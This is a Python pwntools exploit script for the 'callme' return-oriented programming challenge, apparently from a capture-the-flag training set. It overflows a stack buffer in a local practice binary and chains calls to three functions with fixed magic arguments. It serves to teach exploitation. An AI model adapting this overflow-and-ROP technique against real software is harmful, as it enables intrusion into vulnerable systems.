#!/usr/bin/env python3
from pwn import *

gs = '''
break *0x00000000004008f1
break callme_one
break callme_two
break callme_three
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


elf = context.binary = ELF("./callme")
rop = ROP(elf)

rop.raw(b"A" * cyclic_find(0x6161616161616166, n=8))
rop.call('callme_one', [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call('callme_two', [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call('callme_three', [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

log.info(rop.dump())

p = start()
p.sendline(rop.chain())

log.success(p.recvall().decode().strip())
